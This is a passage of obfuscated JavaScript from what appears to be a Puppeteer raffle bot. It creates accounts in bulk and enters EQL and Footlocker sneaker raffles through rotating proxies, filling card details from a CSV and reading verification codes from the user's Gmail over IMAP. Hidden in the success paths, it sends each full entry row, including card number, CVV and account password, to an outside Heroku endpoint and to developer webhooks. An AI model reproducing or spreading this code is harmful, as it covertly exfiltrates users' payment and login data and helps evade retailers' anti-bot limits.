                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f93a8[0x0] + ':' + _0x1f93a8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1180dc = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f93a8[0x0] + ':' + _0x1f93a8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4d521d = await _0x1180dc['newPage']();
                            await _0x4d521d['authenticate']({
                                'username': '' + _0x1f93a8[0x2],
                                'password': '' + _0x1f93a8[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4d521d['setRequestInterception'](!![]), _0x4d521d['on']('request', _0xa7da8a => {
                                _0xa7da8a['resourceType']() === 'image' || _0xa7da8a['resourceType']() === 'font' || _0xa7da8a['resourceType']() === 'media' ? _0xa7da8a['abort']() : _0xa7da8a['continue']();
                            });
                            try {
                                await _0x4d521d['goto']('' + _0x5e91d5);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4d97b0(0x3e8), await _0x4d521d['waitForSelector']('#email'), await _0x4d521d['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4d97b0(0x3e8);
                            try {
                                _0x1d2d26[_0x29f52e]['Url']['includes']('en-GB') ? await _0x4d521d['click']('li[data-value=\x22UK\x20' + _0x1d2d26[_0x29f52e]['Size'] + '\x20/\x20US\x20' + (Number(_0x1d2d26[_0x29f52e]['Size']) + 0x1) + '\x22]') : await _0x4d521d['click']('li[data-value=\x22EU\x20' + _0x1d2d26[_0x29f52e]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x1d2d26[_0x29f52e]['Size']);
                            }
                            await _0x4d97b0(0x6a4), await _0x4d521d['type']('#email', '' + _0x1d2d26[_0x29f52e]['Email']), await _0x4d97b0(0x352), await _0x4d521d['waitForSelector']('#password'), await _0x4d521d['type']('#password', '' + _0x1d2d26[_0x29f52e]['Password']), await _0x4d97b0(0x352), await _0x4d521d['type']('#phone', '' + _0x1d2d26[_0x29f52e]['Phone']), await _0x4d97b0(0x352);
                            const _0x51711f = await _0x4d521d['$']('#title\x20>\x20label');
                            await _0x4d97b0(0x12c);
                            _0x51711f && await _0x51711f['click']();
                            await _0x4d521d['type']('#firstName', '' + _0x1d2d26[_0x29f52e]['FirstName']), await _0x4d97b0(0x352), await _0x4d521d['type']('#lastName', '' + _0x1d2d26[_0x29f52e]['LastName']), await _0x4d97b0(0x352);
                            _0x1d2d26[_0x29f52e]['Url']['includes']('footlocker.de') ? await _0x4d521d['type']('#birthdate', _0x198b8e(0xa, 0x1c) + '.' + _0x198b8e(0xa, 0xc) + '.' + _0x198b8e(0x7c6, 0x7d3)) : await _0x4d521d['type']('#birthdate', _0x198b8e(0xa, 0x1c) + '-' + _0x198b8e(0xa, 0xc) + '-' + _0x198b8e(0x7c6, 0x7d3));
                            await _0x4d97b0(0x352), await _0x4d521d['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x1d2d26[_0x29f52e]['Url']['includes']('en-GB') && await _0x4d521d['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x4d97b0(0x1f4), await _0x4d97b0(0x5dc);
                            if (!_0x5e91d5['includes']('footlocker'))
                                try {
                                    await _0x4d521d['click']('#country');
                                    const _0x4f60cb = await _0x4d521d['$']('li[data-value=\x22' + _0x1d2d26[_0x29f52e]['Country'] + '\x22]');
                                    await _0x4f60cb['click'](), await _0x4f60cb['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x4d97b0(0x3e8);
                            if (!_0x1d2d26[_0x29f52e]['Url']['includes']('en-GB')) {
                                await _0x4d521d['click']('#stateAutocomplete'), await _0x4d97b0(0x1f4);
                                try {
                                    const _0x1c4eff = await _0x4d521d['$x']('//li[text()=\x22' + _0x1d2d26[_0x29f52e]['State'] + '\x22]');
                                    await _0x1c4eff[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Setting\x20Address'), await _0x4d97b0(0x3e8), await _0x4d97b0(0x1f4), await _0x4d521d['type']('#address1', _0x1d2d26[_0x29f52e]['Address1'] + '\x20' + _0x1d2d26[_0x29f52e]['HouseNumber']), await _0x4d97b0(0x1f4), await _0x4d521d['type']('#address2', '' + _0x1d2d26[_0x29f52e]['Address2']), await _0x4d97b0(0x1f4), await _0x4d521d['type']('#city', '' + _0x1d2d26[_0x29f52e]['City']), await _0x4d97b0(0x1f4), await _0x4d521d['type']('#postcode', '' + _0x1d2d26[_0x29f52e]['Zip']), await _0x4d97b0(0x3e8), await _0x4d521d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d97b0(0x3e8), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x5389fe = await _0x4d521d['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5389fe && (await _0x4d521d['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d521d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d521d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d97b0(0x4b0), await _0x4d521d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d97b0(0x1f4), await _0x4d521d['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CardNumber']), await _0x4d97b0(0x320), await _0x4d521d['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4d521d['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4d521d['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['ExpiryDate']), await _0x4d97b0(0x4b0), await _0x4d521d['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4d521d['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4d521d['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CVV']), await _0x4d97b0(0x226), await _0x4d521d['type']('input[name=\x22postalCode\x22]', '' + _0x1d2d26[_0x29f52e]['Zip']), await _0x4d97b0(0x226));
                            const _0x592bec = await _0x4d521d['$']('.__PrivateStripeElement');
                            _0x592bec && (await _0x4d97b0(0x1f4), await _0x4d521d['click']('.__PrivateStripeElement'), await _0x4d521d['click']('.__PrivateStripeElement'), await _0x4d521d['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CardNumber']), await _0x4d521d['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['ExpiryDate']), await _0x4d521d['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CVV']));
                            await _0x4d97b0(0x226), await _0x4d521d['click']('#paymentConsent'), await _0x4d97b0(0x226), await _0x4d521d['click']('#termsConsent'), await _0x4d97b0(0x2bc), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4d521d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d97b0(0x2710);
                            try {
                                await _0x4d521d['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x4d97b0(0xbb8), await _0x4d521d['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x375766 => _0x375766['click']()), await _0x4d521d['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4d6c18 => _0x4d6c18['click']());
                            } catch {
                            }
                            try {
                                await _0x4d521d['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x12489a = await _0x4d521d['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x12489a) {
                                    _0x4a3989['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x1d2d26[_0x29f52e]['Email'] + ',' + _0x1d2d26[_0x29f52e]['Password'] + ',' + _0x1d2d26[_0x29f52e]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x2e72aa() {
                                var _0x13e33c, _0x13e4a5 = ![];
                                for (var _0xb4d136 = 0x0; _0xb4d136 < 0x18; _0xb4d136++) {
                                    async function _0x578727() {
                                        var _0x50629d = new _0x1aebaf({
                                            'user': _0x4562fb['masterMail'],
                                            'password': _0x4562fb['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x811e3b(_0x397cda) {
                                            _0x50629d['openBox']('INBOX', ![], _0x397cda);
                                        }
                                        _0x50629d['once']('ready', function () {
                                            console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x811e3b(function (_0x666c80, _0x3a9f2c) {
                                                console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x666c80)
                                                    throw _0x666c80;
                                                _0x50629d['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x5687f5, _0x52a9b8) {
                                                    if (!_0x52a9b8 || !_0x52a9b8['length'])
                                                        console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x50629d['end']();
                                                    else {
                                                        var _0x1d9965 = _0x50629d['seq']['fetch'](_0x52a9b8, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1d9965['on']('message', function (_0x45d667, _0x441c49) {
                                                            var _0x22fc39 = '(#' + _0x441c49 + ')\x20';
                                                            _0x45d667['on']('body', function (_0x47e84a, _0x592958) {
                                                                _0x372396(_0x47e84a, (_0x226bdb, _0x1ef2e2) => {
                                                                    if (_0x1ef2e2['subject']['includes']('code')) {
                                                                        const _0x4a34d3 = _0x1ef2e2['text']['split']('\x0a\x0a')[0x3], _0x36e3c3 = _0x4a34d3['split']('\x0a')[0x1];
                                                                        _0x13e33c = _0x36e3c3;
                                                                    }
                                                                });
                                                            }), _0x45d667['once']('end', function () {
                                                            });
                                                        }), _0x1d9965['once']('error', function (_0x4ebaef) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1d9965['once']('end', function () {
                                                            _0x50629d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x50629d['once']('error', function (_0x487a77) {
                                            console['log'](_0x1de0e8['red'](_0x487a77['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x13e4a5 = !![];
                                        }), _0x50629d['once']('end', async function () {
                                        }), _0x50629d['connect']();
                                    }
                                    _0x578727(), await _0x4d97b0(0x1388);
                                    if (_0x13e33c)
                                        return _0x13e33c;
                                    if (_0x13e4a5)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0xb4d136 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2e72aa(), await _0x4d97b0(0x1f4), await _0x4d521d['type']('#code', '' + code), await _0x4d97b0(0x3e8), await _0x4d521d['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x1b2b3c => _0x1b2b3c['click']()), await _0x4d521d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x4d521d['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x1d2d26[_0x29f52e]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x4a3989['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x1d2d26[_0x29f52e]['Email'] + ',' + _0x1d2d26[_0x29f52e]['Password'] + ',' + _0x1d2d26[_0x29f52e]['Phone']), _0x436126 = 'no', _0x3b7ca0(_0x1d2d26[_0x29f52e], _0xacb416);
                            var _0x4a6d9b = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'dev', ![]), _0x4522c9 = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'pub', ![]);
                            let _0x386e9d = _0x1d2d26[_0x29f52e];
                            try {
                                prxdata = {
                                    'username': _0x1d8120['replace']('#', ''),
                                    'module': _0xacb416['name'],
                                    'entrydata': JSON['stringify'](_0x386e9d),
                                    'proxy': '' + _0x3d8208[_0x29f52e]
                                };
                                var _0x251738 = JSON['stringify'](prxdata);
                                let _0x14cc89 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x251738, _0x14cc89);
                            } catch (_0x23fcf3) {
                            }
                            const _0x131d30 = {
                                'succesDEVMSG': { 'embeds': [_0x4a6d9b] },
                                'succesPUBMSG': { 'embeds': [_0x4522c9] }
                            };
                            try {
                                _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x131d30['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x131d30['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x131d30['succesPUBMSG']);
                            } catch (_0x44c967) {
                                console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x44c967));
                            }
                        } catch (_0x31777c) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20' + _0x31777c)), _0x271159 = '' + _0x31777c;
                            var _0x5e7d4d = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'dev', !![], _0x271159), _0x4a6d9b = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'dev', ![]), _0x4522c9 = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'pub', ![]);
                            const _0x18bb0a = {
                                'succesDEVMSG': { 'embeds': [_0x4a6d9b] },
                                'succesPUBMSG': { 'embeds': [_0x4522c9] }
                            };
                            _0x18bb0a['errorDEV'] = { 'embeds': [_0x5e7d4d] };
                            _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x18bb0a['errorDEV']);
                            await _0xa7b872(_0x5f83c7, _0x18bb0a['errorDEV']);
                            if (!_0x436126 == 'no')
                                _0x436126 = 'yes';
                        } finally {
                            _0x1180dc && _0x1180dc['close']();
                            if (_0x436126 == 'yes' && _0x243234 != 0x5) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Retrying\x20(' + _0x243234 + '\x20/\x205)')), _0x29f52e = _0x29f52e - 0x1, _0x243234 = _0x243234 + 0x1;
                                continue;
                            }
                            _0x436126 == 'yes' && _0x243234 >= 0x5 && (_0x320814(_0x1d2d26[_0x29f52e], _0xacb416), _0x436126 = 'no', _0x243234 = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    } else {
                        const _0x1fce30 = '' + _0x1d2d26[_0x29f52e]['Url'];
                        if (_0x436126 != 'yes')
                            var _0x436126 = '', _0x243234 = 0x0;
                        if (_0x1d2d26[_0x29f52e]['Email'] == '' || _0x1d2d26[_0x29f52e]['FirstName'] == '' || _0x1d2d26[_0x29f52e]['LastName'] == '') {
                            console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1d2d26[_0x29f52e]['Password'] == '' && (_0x1d2d26[_0x29f52e]['Password'] = 'JRaffles23!');
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x1f93a8 = _0x3d8208[_0x29f52e]['split'](':');
                        else
                            var _0x45c6f5 = Math['round'](Math['random']() * (_0x3d8208['length'] - 0x1)), _0x1f93a8 = _0x3d8208[_0x45c6f5]['split'](':');
                        var _0x1180dc;
                        try {
                            _0x1180dc = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f93a8[0x0] + ':' + _0x1f93a8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1180dc = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f93a8[0x0] + ':' + _0x1f93a8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x552a90 = await _0x1180dc['newPage']();
                            await _0x552a90['authenticate']({
                                'username': '' + _0x1f93a8[0x2],
                                'password': '' + _0x1f93a8[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x552a90['setRequestInterception'](!![]), _0x552a90['on']('request', _0x1ec967 => {
                                _0x1ec967['resourceType']() === 'image' || _0x1ec967['resourceType']() === 'font' || _0x1ec967['resourceType']() === 'media' ? _0x1ec967['abort']() : _0x1ec967['continue']();
                            }), await _0x552a90['goto'](_0x1fce30), await _0x552a90['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x552a90['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x4d97b0(0x7d0), await _0x552a90['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x552a90['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x4d97b0(0x3e8), await _0x552a90['waitForSelector']('#email'), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x552a90['type']('#email', '' + _0x1d2d26[_0x29f52e]['Email']), await _0x4d97b0(0x352), await _0x552a90['waitForSelector']('#password'), await _0x552a90['type']('#password', '' + _0x1d2d26[_0x29f52e]['Password']), await _0x4d97b0(0x352), await _0x552a90['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d97b0(0x1388);
                            if (!_0x1d2d26[_0x29f52e]['Url']['includes']('footlocker'))
                                await _0x552a90['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x552a90['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x3b7ca0(_0x1d2d26[_0x29f52e], _0xacb416), _0x436126 = 'no';
                                continue;
                            }
                            await _0x552a90['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4d97b0(0x3e8);
                            try {
                                _0x1d2d26[_0x29f52e]['Url']['includes']('en-GB') ? await _0x552a90['click']('li[data-value=\x22UK\x20' + _0x1d2d26[_0x29f52e]['Size'] + '\x20/\x20US\x20' + (Number(_0x1d2d26[_0x29f52e]['Size']) + 0x1) + '\x22]') : await _0x552a90['click']('li[data-value=\x22EU\x20' + _0x1d2d26[_0x29f52e]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x1d2d26[_0x29f52e]['Size']);
                            }
                            await _0x4d97b0(0x1f4);
                            const _0xc39e46 = await _0x552a90['$']('#title\x20>\x20label');
                            await _0x4d97b0(0x12c);
                            _0xc39e46 && await _0xc39e46['click']();
                            await _0x552a90['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x552a90['focus']('#postcode'), await _0x552a90['keyboard']['down']('Control'), await _0x552a90['keyboard']['press']('A'), await _0x552a90['keyboard']['up']('Control'), await _0x552a90['keyboard']['press']('Backspace'), await _0x552a90['keyboard']['type'](_0x1d2d26[_0x29f52e]['Zip']), await _0x4d97b0(0x60e), await _0x552a90['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d97b0(0x3e8), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4d97b0(0x1f4);
                            const _0x3a0725 = await _0x552a90['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x3a0725 && (await _0x552a90['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x552a90['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x552a90['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d97b0(0x4b0), await _0x552a90['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d97b0(0x1f4), await _0x552a90['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CardNumber']), await _0x4d97b0(0x320), await _0x552a90['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x552a90['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['ExpiryDate']), await _0x4d97b0(0x4b0), await _0x552a90['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x552a90['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CVV']), await _0x4d97b0(0x226), await _0x552a90['type']('input[name=\x22postalCode\x22]', '' + _0x1d2d26[_0x29f52e]['Zip']), await _0x4d97b0(0x226));
                            const _0x2a5e8f = await _0x552a90['$']('.__PrivateStripeElement');
                            _0x2a5e8f && (await _0x552a90['click']('#billingName'), await _0x552a90['click']('#billingName'), await _0x552a90['type']('#billingName', '' + _0x1d2d26[_0x29f52e]['NameOnCard']), await _0x4d97b0(0x1f4), await _0x552a90['click']('.__PrivateStripeElement'), await _0x552a90['click']('.__PrivateStripeElement'), await _0x552a90['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CardNumber']), await _0x552a90['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['ExpiryDate']), await _0x552a90['keyboard']['type']('' + _0x1d2d26[_0x29f52e]['CVV']));
                            await _0x4d97b0(0x226), await _0x552a90['click']('#paymentConsent'), await _0x4d97b0(0x226), await _0x552a90['click']('#termsConsent'), await _0x4d97b0(0x2bc), console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x552a90['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d97b0(0x2710);
                            try {
                                await _0x552a90['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x4d97b0(0xbb8), await _0x552a90['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x486a23 => _0x486a23['click']()), await _0x552a90['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2eeb77 => _0x2eeb77['click']());
                            } catch {
                            }
                            try {
                                await _0x552a90['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x3b7ca0(_0x1d2d26[_0x29f52e], _0xacb416);
                            var _0x4a6d9b = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'dev', ![]), _0x4522c9 = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'pub', ![]);
                            let _0x456e90 = _0x1d2d26[_0x29f52e];
                            try {
                                prxdata = {
                                    'username': _0x1d8120['replace']('#', ''),
                                    'module': _0xacb416['name'],
                                    'entrydata': JSON['stringify'](_0x456e90),
                                    'proxy': '' + _0x3d8208[_0x29f52e]
                                };
                                var _0x251738 = JSON['stringify'](prxdata);
                                let _0x12482c = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x251738, _0x12482c);
                            } catch (_0x1e8515) {
                            }
                            const _0x58360b = {
                                'succesDEVMSG': { 'embeds': [_0x4a6d9b] },
                                'succesPUBMSG': { 'embeds': [_0x4522c9] }
                            };
                            try {
                                _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x58360b['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x58360b['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x58360b['succesPUBMSG']);
                            } catch (_0x14cc7c) {
                                console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x14cc7c));
                            }
                            _0x436126 = 'no';
                        } catch (_0x2479bd) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20' + _0x2479bd)), _0x271159 = '' + _0x2479bd;
                            var _0x5e7d4d = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'dev', !![], _0x271159), _0x4a6d9b = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'dev', ![]), _0x4522c9 = await _0x4ef820(_0x1d2d26[_0x29f52e], _0xacb416, 'pub', ![]);
                            const _0x31000b = {
                                'succesDEVMSG': { 'embeds': [_0x4a6d9b] },
